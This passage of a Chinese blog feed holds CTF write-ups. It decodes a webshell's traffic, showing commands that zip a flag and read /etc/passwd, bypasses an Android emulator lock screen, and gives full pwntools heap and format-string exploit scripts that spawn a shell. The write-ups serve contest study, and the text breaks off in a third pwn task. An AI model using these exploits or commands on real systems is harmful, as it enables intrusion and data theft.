class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1NTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdd4NDEFi2IFqHVIqP98w32pewCBM9N6myx1E6/4/n/6LjdllCHsW3lkOGU=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1VTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4KTJnCYNlV/QoTP77fccu+igG1z9beslwKBf5/P97qX1kY1jYWJ40OGVh&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mm75CDu2VDRlodXZFXRiAWzZDTEfmIYnJ3OfU57uD0vbvTa3fKCJ6A8R+ZYyG+ZRZOw6ZGl8pagIpszvET+fp0xgX18NH8Eae5ue2n5F7YT3CmDGuoiuS1HCdA3Nmht1OGM1OQ==&quot;</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$comm</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>((<span class="hljs-variable">$comm</span>[<span class="hljs-variable">$i</span>])),<span class="hljs-variable">$key</span>));<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$result</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>((<span class="hljs-variable">$result</span>[<span class="hljs-variable">$i</span>])),<span class="hljs-variable">$key</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/* 执行的命令</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;id&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;whoami&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;ls&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;ls /&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;ls ..&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;zip -o flag.zip /flag -P airDAS1231qaSW@&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;d&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;id&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;cat /etc/passwd&quot;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*命令的结果</span><br><span class="hljs-comment">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-comment">www-data</span><br><span class="hljs-comment">eval.php</span><br><span class="hljs-comment">0</span><br><span class="hljs-comment">bin</span><br><span class="hljs-comment">boot</span><br><span class="hljs-comment">dev</span><br><span class="hljs-comment">etc</span><br><span class="hljs-comment">flag</span><br><span class="hljs-comment">home</span><br><span class="hljs-comment">initrd.img</span><br><span class="hljs-comment">initrd.img.old</span><br><span class="hljs-comment">lib</span><br><span class="hljs-comment">lib32</span><br><span class="hljs-comment">lib64</span><br><span class="hljs-comment">libx32</span><br><span class="hljs-comment">lost+found</span><br><span class="hljs-comment">media</span><br><span class="hljs-comment">mnt</span><br><span class="hljs-comment">opt</span><br><span class="hljs-comment">proc</span><br><span class="hljs-comment">root</span><br><span class="hljs-comment">run</span><br><span class="hljs-comment">sbin</span><br><span class="hljs-comment">srv</span><br><span class="hljs-comment">sys</span><br><span class="hljs-comment">tmp</span><br><span class="hljs-comment">usr</span><br><span class="hljs-comment">var</span><br><span class="hljs-comment">vmlinuz</span><br><span class="hljs-comment">vmlinuz.old</span><br><span class="hljs-comment">index.nginx-debian.html</span><br><span class="hljs-comment">index.php</span><br><span class="hljs-comment">index1.html</span><br><span class="hljs-comment">upload</span><br><span class="hljs-comment">  adding: flag (stored 0%)</span><br><span class="hljs-comment">sh: 1: d: not found</span><br><span class="hljs-comment">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>从命令中发现，服务器中存在<code>flag</code>文件，恶意用户对其进行了加密压缩，解压缩密码为<code>airDAS1231qaSW@</code>，压缩包文件为<code>flag.zip</code>,从数据包中找到并导出<code>flag.zip</code>，解压缩之后获得<code>flag</code></p><h2 id="机你太美">机你太美</h2><p><code>npbk文件</code>是夜神模拟器的备份文件，导入文件创建模拟器,开机之后发现存在密码，使用adb连接模拟器，进入<code>/data/system</code>目录，删除<code>locksettings.db</code>文件之后重启模拟器，发现不需要密码了</p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E.jpg" srcset="/img/loading.gif" lazyload alt=""><br>模拟器中除去自带的软件之外，安装了<code>QQ</code>和<code>Skred</code>，<code>QQ</code>是登不进去的，从<code>Skred</code>中发现了通信的记录，记录中一个备注为<code>bbb</code>的人向模拟器发送了多个压缩包和两张图片</p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-1.jpg" srcset="/img/loading.gif" lazyload alt=""><br>所有的压缩包都带有密码，那只能先从两张图片中找线索了<br>从<code>1675921115230.jpg</code>的<code>A2</code>通道中发现数据<br><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-2.jpg" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br>a=cv2.imread(<span class="hljs-string">&#x27;1675921115230.jpg&#x27;</span>,cv2.IMREAD_UNCHANGED)<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-keyword">if</span> j[<span class="hljs-number">3</span>]==<span class="hljs-number">255</span>:<br>            f.write(<span class="hljs-string">&quot;1&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            f.write(<span class="hljs-string">&quot;0&quot;</span>)<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将数据A2通道的数据导出之后得到解密异常位置得到</span><br><span class="hljs-string">        e01544a9333ef62a3aa27357eb52ea8a</span><br><span class="hljs-string">      这是72f3.zip的密码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-3.jpg" srcset="/img/loading.gif" lazyload alt=""><br>查看另一张图片的<code>exif</code>信息发现，在<code>User Comment</code>中提示需要异或<code>DASCTF2022</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=<span class="hljs-string">b&#x27;DASCTF2022&#x27;</span><br>d1=f.read()<br>e=[]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    e.append(v^d[i%<span class="hljs-number">10</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将flag文件的内容异或DASCTF2022后得到flag</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IO结构体分析</title>
    <link href="/page/heap/IO%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/"/>
    <url>/page/heap/IO%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c24d055648a467a87e29038adb5f59e3e1472c5268e72ab3833b55e5b1149b7d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF2021-pwn</title>
    <link href="/page/wp/NCTF2021-pwn/"/>
    <url>/page/wp/NCTF2021-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="ezheap">ezheap</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap.jpg" srcset="/img/loading.gif" lazyload alt="alloc函数代码" title="alloc函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap-1.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p>在<code>delete函数</code>中存在<code>UAF漏洞</code>，可以多次释放同一个<code>chunk</code>，但如果<code>chunk</code>已经被释放，则无法修改<code>chunk</code>数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,text=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,text</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1:4444&#x27;</span>)<br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#8</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#9</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#10</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>) <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    释放chunk 将tcache bin填满，达到将chunk放入unsorted bin中的目的</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>free(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>main_arena=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x60</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook-<span class="hljs-number">0x10</span>))<br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">9</span>)<br>show(<span class="hljs-number">9</span>) <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    因为在2.33 中单链表bin中chunk的地址被加密了，所以需要</span><br><span class="hljs-string">    向unsorted bin中放入两个chunk，用于获取chunk的地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <br>heap_add=u64(p.read(<span class="hljs-number">8</span>))  <span class="hljs-comment">#7</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_add))<br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#11</span><br>free(<span class="hljs-number">6</span>)<br>c6_add=heap_add-<span class="hljs-number">0x90</span><br>hook_add=((c6_add+<span class="hljs-number">0x10</span>)&gt;&gt;<span class="hljs-number">12</span>)^(free_hook)<br>edit(<span class="hljs-number">11</span>,p64(hook_add))<br><br>add(<span class="hljs-number">128</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>) <span class="hljs-comment">#12</span><br>add(<span class="hljs-number">128</span>,p64(system)) <span class="hljs-comment">#13</span><br>free(<span class="hljs-number">12</span>) // 利用free_hook 执行 system(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mmmmmmmap">mmmmmmmap</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap-1.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap-3.jpg" srcset="/img/loading.gif" lazyload alt="fmt函数代码" title="fmt函数代码"></p><p>在<code>fmt函数</code>中，存在格式化字符串漏洞，不过前提时输出<code>buf</code>指向地址处空间时出错，程序在正常情况下调用<code>write</code>是不会出问题，所以只能先让<code>buf</code>指向区域无法访问，然后在指向<code>write</code>时就会报错返回小于0的数字</p><p>因为<code>buf</code>指向的区域为堆空间，而对堆空间进行释放时，是不会修改空间的权限的，只有对<code>mmap</code>分配的<code>chunk</code>，进行释放操作时才会使空间无法访问，所以需要先伪造<code>buf</code>指向的<code>chunk</code>为<code>mmap</code>分配的<code>chunk</code>，且<code>chunk</code>的大小要与<code>page</code>对齐，也就是<code>0x1000</code>,在<code>edit函数</code>中存在<code>off by one</code>漏洞，刚好可以利用这个达到目的</p><p>然后利用非栈中格式化字符串，构造<code>exit_hook</code>，调用<code>exit</code>函数获取<code>shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>,checksec=<span class="hljs-number">0</span>)<br>ld=ELF(<span class="hljs-string">&#x27;ld-2.31.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;mmmmmmmap&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,text=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,text</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    data=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:<br>        data+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;INPUT:\n&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getdata</span>(<span class="hljs-params">off</span>):<br>    fmt(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(off)+<span class="hljs-string">&#x27;$p\n&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">return</span> addr<br>    <br>p=remote(<span class="hljs-string">&quot;127.0.0.1:4444&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>add(<span class="hljs-number">0xd18</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0xff8</span>)<span class="hljs-comment">#2</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    这里的chunk0，就是为了让chunk2的地址&amp;0xfff==0</span><br><span class="hljs-string">    0xff8 chunksize== 0x1001  </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x2000</span>))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在edit函数中会对输入的数据异或3，而且会多异或一个字节</span><br><span class="hljs-string">    所以会将chunk 2的size变成0x1002 就表示chunk2由mmap分配</span><br><span class="hljs-string">    而且因为inuse位为0，所以mmap在释放chunk2时会连带释放chunk2前面的0x2000个字节的数据</span><br><span class="hljs-string">    buf指向的空间就在这0x2000个字节里面</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>free(<span class="hljs-number">2</span>)<br><br>p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>fmt(<span class="hljs-string">b&#x27;%11$p\n%7$p\n&#x27;</span>)<br>libc.address=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">243</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>e.address=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x18b0</span><br>one_gadget=libc.address+<span class="hljs-number">0xe3b2e</span><br>ld.address=libc.address+<span class="hljs-number">0x1f4000</span><br>_rtld_global=ld.sym[<span class="hljs-string">&#x27;_rtld_global&#x27;</span>]<br>_rtld_lock=_rtld_global+<span class="hljs-number">0xf08</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address),<span class="hljs-built_in">hex</span>(e.address))<br>fmt(<span class="hljs-string">&quot;%13$p\n%41$p&quot;</span>)<br>_13=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)<br>_41=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xfffffffffffffff0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(_13),<span class="hljs-built_in">hex</span>(_41))<br>ext=e.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ext))<br>f=bssfmt(fmt)<br>f.fmt_edit(p64(_rtld_lock),<span class="hljs-number">13</span>,<span class="hljs-number">41</span>,_41,<span class="hljs-number">2</span>)<br>off=<span class="hljs-number">41</span>+((_41-_13)//<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(off)<br>f.fmt_edit(p64(one_gadget),<span class="hljs-number">41</span>,off,_rtld_lock,<span class="hljs-number">1</span>)<br>  <span class="hljs-comment"># 通过修改 rtld_lock_default_lock_recursive 获取shell</span><br>p.sendline(<span class="hljs-string">&#x27;exit\n\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="vmstack">vmstack</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-vmstack.jpg" srcset="/img/loading.gif" lazyload alt="程序主要代码" title="程序主要代码"></p><p>这个程序相当于一个代码解析器，程序中可以控制<code>rax</code>,<code>rdi</code>,<code>rsi</code>,<code>rdx</code>寄存器的值，刚好是执行系统调用时需要用到的寄存器，而且程序中也可以执行系统调用，不过禁用了<code>execve</code>，所以我们无法通过执行<code>execve(&quot;/bin/sh&quot;)</code>获取<code>shell</code>，只能通过<code>orw</code>的形式获取<code>flag</code>，程序存在一个单独的栈空间，所以我们无法通过栈获取程序中可以修改的空间，那么我们就需要通过brk系统调用获取空间地址，然后向空间中写入要读取的文件的名称，然后通过<code>orw</code>获取文件内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 